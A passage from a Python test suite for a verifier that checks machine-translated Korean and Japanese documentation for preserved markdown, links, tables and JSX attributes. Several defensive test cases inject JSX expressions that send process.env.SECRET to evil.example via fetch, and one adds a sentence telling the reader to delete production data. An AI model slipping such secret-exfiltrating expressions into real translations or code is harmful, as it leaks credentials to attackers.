            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "잠금 | 쓰기 방지\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_protected_legacy_table_values(self):
        source = (
            "Setting | Facade | Provider | Type\n"
            "------- | ------ | -------- | ----\n"
            "(APP_ENV) 'local' | Auth (Instance) | "
            "Amazon Web Services | ?string\n"
            "(bool) true | Queue (Base Class) | "
            "Laravel Vapor | array<string>\n"
        )
        translated = (
            "<!-- Setting | Facade | Provider | Type "
            "------- | ------ | -------- | ---- "
            "(APP_ENV) 'local' | Auth (Instance) | "
            "Amazon Web Services | ?string "
            "(bool) true | Queue (Base Class) | "
            "Laravel Vapor | array<string> -->\n"
            "설정 | 파사드 | 제공자 | 타입\n"
            "------- | ------ | -------- | ----\n"
            "(APP_ENV) 'local' | Auth (Instance) | "
            "Amazon Web Services | ?string\n"
            "(bool) true | Queue (Base Class) | "
            "Laravel Vapor | array<string>\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_untranslated_single_word_legacy_table_prose(self):
        source = (
            "Color | Description\n"
            "----- | -----------\n"
            "Red | Indicates danger\n"
        )
        translated = (
            "<!-- Color | Description ----- | ----------- "
            "Red | Indicates danger -->\n"
            "색상 | 설명\n"
            "----- | -----------\n"
            "Red | 위험을 나타냅니다\n"
        )

        issues = response_contract.verify(
            translated,
            source,
            locale="ko",
        )

        self.assertIn("provider untranslated source text", issues)
        self.assertIn("provider target language mismatch", issues)


    def test_rejects_changed_single_word_legacy_table_identifier(self):
        source = (
            "Feature | Description\n"
            "------- | -----------\n"
            "API | Request layer\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ----------- "
            "API | Request layer -->\n"
            "기능 | 설명\n"
            "SDK | 요청 계층\n"
        )

        self.assertIn(
            "provider protected term mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_partial_prose_echo_in_a_legacy_pipe_table(self):
        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "Lock | Prevent writes를 차단합니다\n"
        )

        self.assertIn(
            "provider untranslated source text",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_preserved_indented_command(self):
        source = "    vagrant destroy\n"
        translated = (
            "<!--     vagrant destroy -->\n"
            "    vagrant destroy\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_exact_protected_technical_phrase(self):
        cases = (
            "PADDLE_SANDBOX=true",
            "**whereDate / whereMonth / whereDay / whereYear / whereTime**",
        )
        for source_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{source_body}\n"
                )

                self.assertEqual(
                    response_contract.verify(
                        translated,
                        source_body + "\n",
                        locale="ko",
                    ),
                    [],
                )

    def test_accepts_translated_identifier_only_legacy_pipe_table(self):
        source = (
            "Facade | Class\n"
            "------- | -------\n"
            "App | `Application`\n"
        )
        translated = (
            "<!-- Facade | Class ------- | ------- App | `Application` -->\n"
            "파사드 | 클래스\n"
            "------- | -------\n"
            "App | `Application`\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_preserved_inline_code_only_paragraph(self):
        source = "`Illuminate\\Database\\Grammar`\n"
        translated = (
            "<!-- `Illuminate\\Database\\Grammar` -->\n"
            "`Illuminate\\Database\\Grammar`\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_unannotated_inline_code_only_identifier_list(self):
        source = "- `data`\n- `render`\n- `resolve`\n- `shouldRender`\n"

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )

    def test_accepts_multi_backtick_inline_code_only_identifier_list(self):
        source = "- ``data`value``\n- ``render`value``\n"

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )

    def test_rejects_changed_inline_code_only_identifier_list(self):
        source = "- `data`\n- `render`\n"
        translated = "- `data`\n- `changed`\n"

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            ["provider inline code mismatch", "provider protected term mismatch"],
        )

    def test_accepts_product_heavy_translation(self):
        source = "**Supported providers:** Anthropic, Gemini\n"
        translated = (
            "<!-- **Supported providers:** Anthropic, Gemini -->\n"
            "**지원 제공자:** Anthropic, Gemini\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_mostly_untranslated_prose_with_target_suffix(self):
        source = (
            "Acquire the cache lock before updating the stored application value.\n"
        )
        translated = (
            "<!-- Acquire the cache lock before updating the stored application "
            "value. -->\n"
            "Acquire the cache lock before updating the stored application "
            "값입니다.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            ["provider target language mismatch"],
        )

    def test_rejects_comment_without_owned_body(self):
        source = "Acquire the lock.\n"
        translated = "<!-- Acquire the lock. -->\n"

        self.assertEqual(
            response_contract.verify(translated, source),
            [
                "provider block signature mismatch",
                "provider annotation ownership mismatch",
            ],
        )

    def test_rejects_annotations_grouped_away_from_their_bodies(self):
        source = "First paragraph.\n\nSecond paragraph.\n"
        translated = """<!-- First paragraph. -->
<!-- Second paragraph. -->
첫 번째 문단입니다.

두 번째 문단입니다.
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_annotation_separated_from_body_by_code(self):
        source = """```php
Cache::lock('foo');
```

Acquire the cache lock.
"""
        translated = """<!-- Acquire the cache lock. -->
```php
Cache::lock('foo');
```

캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_exact_english_echo(self):
        source = "Acquire the cache lock before updating the value.\n"
        translated = """<!-- Acquire the cache lock before updating the value. -->
Acquire the cache lock before updating the value.
"""

        self.assertIn(
            "provider untranslated source text",
            response_contract.verify(translated, source),
        )

    def test_rejects_english_echo_with_appended_target_text(self):
        source = "Acquire the cache lock before updating the value.\n"
        translated = """<!-- Acquire the cache lock before updating the value. -->
Acquire the cache lock before updating the value. 한
"""

        self.assertIn(
            "provider untranslated source text",
            response_contract.verify(translated, source),
        )

    def test_rejects_changed_markdown_link_before_patch(self):
        source = "Read the [cache guide](cache.md) before continuing.\n"
        translated = (
            "<!-- Read the [cache guide](cache.md) before continuing. -->\n"
            "계속하기 전에 [다른 안내](other.md)를 읽으세요.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [
                "provider link target mismatch",
                "provider link label mismatch",
                "provider link pair mismatch",
            ],
        )

    def test_rejects_changed_markdown_link_title_before_patch(self):
        source = 'Read the [cache guide](cache.md "Cache guide").\n'
        translated = (
            '<!-- Read the [cache guide](cache.md "Cache guide"). -->\n'
            '[cache guide](cache.md "캐시 안내")를 읽으세요.\n'
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            ["provider link title mismatch"],
        )

    def test_accepts_translated_image_alt_with_ordered_target_and_title(self):
        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        translated = (
            '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
            '고양이 이미지를 표시합니다: ![고양이](cat.png "Cat title").\n\n'
            '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
            '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
        )

        self.assertEqual(
            [],
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_markdown_image_target_and_title_drift_before_patch(self):
        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        cases = (
            (
                "swapped targets",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](dog.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](cat.png "Dog title").\n'
                ),
                "provider link target mismatch",
            ),
            (
                "missing image",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Cat title").\n'
                ),
                "provider link target mismatch",
            ),
            (
                "changed target",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](wrong.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "provider link target mismatch",
            ),
            (
                "swapped titles",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Dog title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Cat title").\n'
                ),
                "provider link title mismatch",
            ),
            (
                "changed title",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Wrong title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "provider link title mismatch",
            ),
        )

        for name, translated, expected_issue in cases:
            with self.subTest(name=name):
                self.assertIn(
                    expected_issue,
                    response_contract.verify(
                        translated,
                        source,
                        locale="ko",
                    ),
                )

    def test_accepts_normalized_reference_definition_label_before_patch(self):
        source = '[Cache \t DOC]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache doc]: /docs/13.x/cache "Cache docs"\n'

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertEqual(issues, [])

    def test_rejects_reference_definition_version_drift_before_patch(self):
        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[CACHE-DOC]: /docs/12.x/cache "Cache docs"\n'

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertIn("provider link target mismatch", issues)
        self.assertIn("provider link pair mismatch", issues)
        self.assertNotIn("provider link label mismatch", issues)

    def test_rejects_reference_definition_title_drift_before_patch(self):
        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache-doc]: /docs/13.x/cache "다른 제목"\n'

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertIn("provider link title mismatch", issues)
        self.assertNotIn("provider link target mismatch", issues)
        self.assertNotIn("provider link label mismatch", issues)
        self.assertNotIn("provider link pair mismatch", issues)

    def test_rejects_missing_duplicate_reference_definition_before_patch(self):
        definition = '[cache-doc]: /docs/13.x/cache "Cache docs"'
        source = f"{definition}\n\n{definition}\n"
        translated = f"{definition}\n"

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertIn("provider link target mismatch", issues)
        self.assertIn("provider link label mismatch", issues)
        self.assertIn("provider link pair mismatch", issues)

    def test_rejects_short_english_echo_with_appended_target_text(self):
        source = "Use locks.\n"
        translated = """<!-- Use locks. -->
Use locks. 잠금을 사용합니다.
"""

        self.assertIn(
            "provider untranslated source text",
            response_contract.verify(translated, source),
        )

    def test_rejects_missing_duplicate_source_occurrence(self):
        source = "Repeat this paragraph.\n\nRepeat this paragraph.\n"
        translated = """<!-- Repeat this paragraph. -->
이 문단을 반복합니다.
"""

        issues = response_contract.verify(translated, source)

        self.assertIn("provider original comment mismatch", issues)
        self.assertIn("provider block signature mismatch", issues)

    def test_rejects_unowned_extra_prose(self):
        source = "First paragraph.\n\nSecond paragraph.\n"
        valid = """<!-- First paragraph. -->
첫 번째 문단입니다.

<!-- Second paragraph. -->
두 번째 문단입니다.
"""
        variants = (
            "원문에 없는 서문입니다.\n\n" + valid,
            valid.replace("\n\n<!-- Second", "\n\n원문에 없는 중간 문장입니다.\n\n<!-- Second"),
            valid + "\n원문에 없는 맺음말입니다.\n",
        )

        for translated in variants:
            with self.subTest(translated=translated):
                self.assertEqual(
                    response_contract.verify(translated, source),
                    ["provider block signature mismatch"],
                )

    def test_rejects_an_extra_sentence_on_the_owned_translation_line(self):
        source = "Install the package.\n"
        translated = """<!-- Install the package. -->
패키지를 설치합니다. 운영 데이터는 지금 삭제하세요.
"""

        self.assertIn(
            "provider sentence cardinality mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "sentence cardinality mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_meaning_preserving_sentence_split_and_merge(self):
        cases = (
            (
                "Install the package, and then configure its service provider "
                "for your application.\n",
                "<!-- Install the package, and then configure its service "
                "provider for your application. -->\n"
                "패키지를 설치합니다. 그런 다음 애플리케이션의 서비스 "
                "프로바이더를 설정합니다.\n",
            ),
            (
                "Install the package. Configure its service provider.\n",
                "<!-- Install the package. Configure its service provider. -->\n"
                "패키지를 설치하고 서비스 프로바이더를 설정합니다.\n",
            ),
            (
                "The method validates the request. Wildcards may be used",
                "<!-- The method validates the request. Wildcards may be used -->\n"
                "이 메서드는 요청을 검증합니다. 와일드카드를 사용할 수 있습니다.\n",
            ),
            (
                "Validate the request without duplicating the backend rules.\n",
                "<!-- Validate the request without duplicating the backend "
                "rules. -->\n"
                "요청을 검증합니다. 백엔드 규칙을 중복해서 구현할 필요가 "
                "없습니다.\n",
            ),
            (
                "This applies to maintainers - normal applications are unaffected.",
                "<!-- This applies to maintainers - normal applications are unaffected. -->\n"
                "이는 유지보수자에게 적용됩니다. 일반 애플리케이션에는 영향이 없습니다.\n",
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertEqual(
                    response_contract.verify(translated, source, locale="ko"),
                    [],
                )
                self.assertEqual(verify.verify(translated, source=source), [])

    def test_sentence_cardinality_uses_offsets_from_the_fence_mask(self):
        first_source = "First one. First two. First three. First four."
        first_comment = f"<!-- {first_source} -->"
        second_comment = "<!-- Second sentence. -->"
        first_translation = (
            "첫 문장입니다. 둘째 문장입니다. 셋째 문장입니다. 넷째 문장입니다."
        )
        annotated_tail = (
            f"{first_comment}\n{first_translation}\n\n{second_comment}"
        )
        removed_line_length = len(annotated_tail) - len(first_comment)
        code_payload = "x" * (removed_line_length - 1)
        source = (
            f"```text\n{code_payload}\n```\n\n"
            f"{first_source}\n\nSecond sentence.\n"
        )
        translated = (
            f"```text\n{code_payload}\n```\n\n"
            f"{annotated_tail}\n두 번째 문장입니다.\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_paragraph_changed_to_a_list(self):
        source = "Acquire the cache lock.\n"
        translated = """<!-- Acquire the cache lock. -->
- 캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider block signature mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_list_quote_table_and_code_structure(self):
        source = """- First item.
- Second item.

> Quoted guidance.

| Name | Value |
| --- | --- |
| Cache | Lock |

```php
Cache::lock('foo');
```
"""
        translated = """<!-- - First item. - Second item. -->
- 첫 번째 항목입니다.
- 두 번째 항목입니다.

> 인용 안내입니다.

| 이름 | 값 |
| --- | --- |
| Cache | 잠금 |

```php
Cache::lock('foo');
```
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_provider_fenced_code_content_changes(self):
        source = """Run the command.

```php
Cache::lock('foo');
```
"""
        translated = """<!-- Run the command. -->
명령을 실행합니다.

```php
Cache::forget('foo');
```
"""

        self.assertIn(
            "provider code block mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_unchanged_toc_link_list_without_annotations(self):
        source = """- [Cache Locks](#cache-locks)
- [Managing Locks](#managing-locks)
"""

        self.assertEqual(response_contract.verify(source, source), [])

    def test_rejects_changed_nested_list_indentation(self):
        source = """- Parent item.
  - Child item.
"""
        translated = """<!-- - Parent item. - Child item. -->
- 상위 항목입니다.
- 하위 항목입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source),
            [
                "provider block signature mismatch",
                "provider markdown structure mismatch",
            ],
        )

    def test_rejects_changed_nested_quote_depth(self):
        source = "> Outer quote.\n> > Inner quote.\n"
        translated = """<!-- Outer quote. -->
> 바깥 인용입니다.
<!-- Inner quote. -->
> 안쪽 인용입니다.
"""

        issues = response_contract.verify(translated, source)

        self.assertIn("provider markdown structure mismatch", issues)
        self.assertIn("provider annotation ownership mismatch", issues)

    def test_rejects_changed_navigation_attribute(self):
        source = '<TabItem value="composer" label="Composer">\n'
        translated = '<TabItem value="composer" label="コンポーザー">\n'

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_translated_display_attribute(self):
        source = '<img src="cache.png" alt="Cache lock diagram"/>\n'
        translated = '<img src="cache.png" alt="キャッシュロックの図"/>\n'

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_accepts_translated_jsx_brace_display_attribute(self):
        source = '<Widget aria-label={"Cache lock"} />\n'
        translated = """<!-- <Widget aria-label={"Cache lock"} /> -->
<Widget aria-label={"キャッシュロック"} />
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_dynamic_jsx_display_attribute_change(self):
        source = '<Widget aria-label={label} />\n'
        translated = """<!-- <Widget aria-label={label} /> -->
<Widget aria-label={process.env.SECRET} />
"""

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_expression_hidden_between_display_strings(self):
        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + process.env.SECRET + " 状態"} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_accepts_translated_display_strings_around_same_expression(self):
        source = (
            '<img src="/a.png" '
            'alt={"Cache " + labels.safe + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={"キャッシュ " + labels.safe + " 状態"} />\n'
        )

        self.assertNotIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_string_argument_inside_display_expression(self):
        source = (
            '<img src="/a.png" '
            'alt={getLabel("safe") + " status"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={getLabel("secret") + " 状態"} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_display_expression_containing_regex_literal(self):
        source = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test(label) ? "safe" : "other"} />\n'
        )
        translated = (
            '<img src="/a.png" '
            'alt={/[\\\'>]/.test((fetch("https://evil.example/" '
            '+ process.env.SECRET), label)) ? "安全" : "その他"} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_display_expression_hidden_between_js_comments(self):
        source = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (void 0) + /* " + */ + " visible"} />\n'
        )
        translated = (
            '<img src="/a.png" alt={label /* + " */ '
            '+ (globalThis.pwned = process.env.SECRET) '
            '+ /* " + */ + " 表示"} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_quote_text_inside_display_regex_literal(self):
        source = '<img src="/a.png" alt={/a+\'SAFE\'+b/.source} />\n'
        translated = '<img src="/a.png" alt={/a+\'EVIL\'+b/.source} />\n'

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_expression_after_control_statement_regex(self):
        source = (
            '<Widget value={() => { if (x) /\\}\\}>/.test(safe); '
            'return safe; }} keep="yes" />\n'
        )
        translated = (
            '<Widget value={() => { if (x) /\\}\\}>/.test('
            '(fetch(process.env.SECRET), safe)); return evil; }} '
            'keep="no" />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_changed_display_expression_after_js_block_comment(self):
        source = (
            '<Widget aria-label={label /* } > */ '
            '+ "English text"} />\n'
        )
        translated = (
            '<Widget aria-label={label /* } > */ '
            '+ (fetch("https://evil.example/" + process.env.SECRET), '
            '"日本語の説明文")} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_changed_display_expression_in_nested_template(self):
        source = (
            '<Widget aria-label={`outer ${`inner } > English text '
            '${label}`}`} />\n'
        )
        translated = (
            '<Widget aria-label={`outer ${`inner } > 日本語の説明文 '
            '${(fetch("https://evil.example/" + process.env.SECRET), '
            'label)}`}`} />\n'
        )

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_rejects_non_display_attribute_containing_display_attribute_text(self):
        source = '<Widget title="Example aria-label=\'Original\' text" />\n'
        translated = """<!-- <Widget title="Example aria-label='Original' text" /> -->
<Widget title="Example aria-label='Changed' text" />
"""

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_attribute_after_jsx_template_literal_comparison(self):
        source = '<Widget value={`} >`} title="keep" />\n'
        translated = """<!-- <Widget value={`} >`} title="keep" /> -->
<Widget value={`} >`} title="changed" />
"""

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_autolink_moved_inside_translated_paragraph(self):
        source = "<https://laravel.com> provides official documentation.\n"
        translated = """<!-- <https://laravel.com> provides official documentation. -->
공식 문서는 <https://laravel.com>에서 제공합니다.
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_dropped_source_html_comment(self):
        source = """<!-- keep: generated reference -->

Acquire the cache lock.
"""
        translated = """<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_preserved_inline_source_html_comment(self):
        source = "Before <!-- keep --> after.\n"
        translated = """<!-- Before <!-- keep --&gt; after. -->
이전 <!-- keep --> 이후입니다.
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_relocated_source_html_comment(self):
        source = """<!-- keep -->

Paragraph to translate here.
"""
        translated = """<!-- Paragraph to translate here. -->
번역할 문단입니다.

<!-- keep -->
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_extra_structural_source_comment(self):
        source = "Hello world.\n"
        comments = (
            "<!-- > hidden -->",
            "<!-- | hidden | -->",
            '<!-- <a name="evil"></a> -->',
            "<!--\n<p>\n<img src=\"evil.png\"/>\n</p>\n-->",
        )
        for comment in comments:
            with self.subTest(comment=comment):
                translated = f"""{comment}
<!-- Hello world. -->
안녕하세요.
"""

                self.assertIn(
                    "provider source comment mismatch",
                    response_contract.verify(translated, source, locale="ko"),
                )
                self.assertIn(
                    "source comment mismatch",
                    verify.verify(translated, source=source),
                )

    def test_final_verifier_rejects_stale_legacy_note_comment(self):
        source = """> [!NOTE]
> Current guidance.
"""
        translated = """<!-- > **Note:** Current guidance. -->
> [!NOTE]
> 現在の案内です。
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_jsx_attribute_after_expression_comparison(self):
        source = '<Widget visible={count > 0} value="keep" />\n'
        translated = """<!-- <Widget visible={count > 0} value="keep" /> -->
<Widget visible={count > 0} value="changed" />
"""

        self.assertIn(
            "provider HTML markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_nested_quote_removed_from_list(self):
        source = """- Parent item.
  > Nested quote guidance.
"""
        translated = """<!-- - Parent item. -->
- 상위 항목입니다.
  <!-- Nested quote guidance. -->
  중첩 인용 안내입니다.
"""

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_extra_unmarked_list_continuation(self):
        source = "- Item to translate.\n"
        translated = """<!-- - Item to translate. -->
- 번역할 항목입니다.
  원문에 없는 추가 설명입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source),
            ["provider paragraph layout mismatch"],
        )

    def test_rejects_changed_admonition_type(self):
        source = "> [!NOTE]\n> Cache lock guidance.\n"
        translated = """> [!WARNING]
> <!-- Cache lock guidance. -->
> 캐시 잠금 안내입니다.
"""

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_localized_legacy_admonition_type_downgrade(self):
        source = "> **Caution:**\n> Important safety guidance.\n"
        translated = "> **注意:**\n> 重要な安全上の案内です。\n"

        self.assertIn(
            "provider admonition type mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_accepts_same_provider_admonition_type_from_inline_source_marker(self):
        source = "> [!NOTE] Cache lock guidance.\n"
        translated = """> [!NOTE]
> <!-- Cache lock guidance. -->
> 캐시 잠금 안내입니다.
"""

        self.assertNotIn(
            "provider admonition type mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_changed_provider_admonition_type_in_markdown_containers(self):
        cases = (
            (
                "- > [!WARNING] Protect credentials.\n",
                "- > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "1. > [!WARNING] Protect credentials.\n",
                "1. > [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                ">> [!WARNING] Protect credentials.\n",
                ">> [!NOTE] 자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]Protect credentials.\n",
                "> [!NOTE]자격 증명을 보호합니다.\n",
            ),
            (
                "> [!WARNING]\n> Protect credentials.\n",
                "> [!warning]\n> 자격 증명을 보호합니다.\n",
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertIn(
                    "provider admonition type mismatch",
                    response_contract.verify(
                        translated,
                        source,
                        locale="ko",
                    ),
                )

    def test_rejects_changed_table_separator_alignment(self):
        source = """| Left | Right |
| :--- | ---: |
| Cache | Lock |
"""
        translated = """| 왼쪽 | 오른쪽 |
| ---: | :--- |
| 캐시 | 잠금 |
"""

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_duplicate_translated_table_row(self):
        source = """| Name | Value |
| --- | --- |
| Cache | Stores values |
"""
        translated = """| 이름 | 값 |
| --- | --- |
| 이름 | 값 |
"""

        self.assertIn(
            "provider duplicate table row",
            response_contract.verify(translated, source),
        )

    def test_rejects_removed_emphasis_delimiters(self):
        source = "Use **atomic locks** before updating the value.\n"
        translated = """<!-- Use **atomic locks** before updating the value. -->
값을 업데이트하기 전에 atomic locks를 사용합니다.
"""

        self.assertIn(
            "provider inline markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_removed_single_emphasis_around_a_link(self):
        source = (
            "Read *the [atomic lock guide](https://example.com/locks)* now.\n"
        )
        translated = (
            "<!-- Read *the [atomic lock guide](https://example.com/locks)* now. -->\n"
            "[atomic lock guide](https://example.com/locks)를 읽으세요.\n"
        )

        self.assertIn(
            "provider inline markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_removed_underscore_emphasis(self):
        source = "Use _atomic locks_ before updating the value.\n"
        translated = """<!-- Use _atomic locks_ before updating the value. -->
값을 업데이트하기 전에 atomic locks를 사용합니다.
"""

        self.assertIn(
            "provider inline markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_list_asterisk_is_not_treated_as_emphasis(self):
        source = "* Use atomic locks here.\n"
        translated = """<!-- * Use atomic locks here. -->
* 여기서 atomic locks를 사용합니다.
"""

        self.assertNotIn(
            "provider inline markup mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_changed_task_checkbox_state(self):
        source = "- [ ] Pending task.\n- [x] Completed task.\n"
        translated = """<!-- - [ ] Pending task. - [x] Completed task. -->
- [x] 대기 중인 작업입니다.
- [ ] 완료된 작업입니다.
"""

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_removed_blockquote_hard_break(self):
        source = "> First source line.  \n> Second source line.\n"
        translated = (
            "> <!-- First source line. Second source line. -->\n"
            "> 첫 번째 줄입니다.\n"
            "> 두 번째 줄입니다.\n"
        )

        self.assertIn(
            "provider markdown structure mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_extra_line_inside_translated_paragraph(self):
        source = "First paragraph has enough words.\n"
        translated = """<!-- First paragraph has enough words. -->
첫 번째 문단입니다.
원문에 없는 추가 설명입니다.
"""

        self.assertIn(
            "provider paragraph layout mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_paragraph_indented_as_a_markdown_code_block(self):
        source = "Acquire the cache lock.\n"
        translated = """<!-- Acquire the cache lock. -->
    캐시 잠금을 획득합니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            ["provider paragraph indentation mismatch"],
        )

    def test_rejects_extra_line_inside_inline_html_paragraph(self):
        source = "<em>Cache</em> is useful here.\n"
        translated = """<!-- <em>Cache</em> is useful here. -->
<em>Cache</em>는 유용합니다.
원문에 없는 추가 줄입니다.
"""

        self.assertIn(
            "provider paragraph layout mismatch",
            response_contract.verify(translated, source),
        )

    def test_accepts_line_preserving_raw_html_table_translation(self):
        source = """<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""
        translated = """<table>
